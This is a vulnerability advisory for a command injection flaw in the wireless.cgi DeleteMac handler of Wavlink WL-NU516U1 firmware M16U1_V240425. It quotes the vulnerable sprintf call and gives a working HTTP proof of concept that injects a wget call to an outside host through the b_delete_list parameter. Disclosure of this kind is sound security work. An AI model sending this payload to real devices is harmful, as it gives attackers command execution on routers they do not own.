# WL-NU516U1 wireless.cgi DeleteMac b_delete_list Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `DeleteMac`, the function `sub_402D1C` is invoked.

The `b_delete_list` parameter is the 3rd argument in the sprintf call:

```c
sprintf(v20, "/etc/lighttpd/www/cgi-bin/del_mac.sh y%s y%s y%s y%s &", delete_list, delete_al_mac, b_delete_list, b_delete_al_mac);
sub_405314(v20);
```

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 88

page=DeleteMac&delete_list=AA&delete_al_mac=BB&b_delete_list=$(wget http://192.168.6.1:6666/b_del)
```
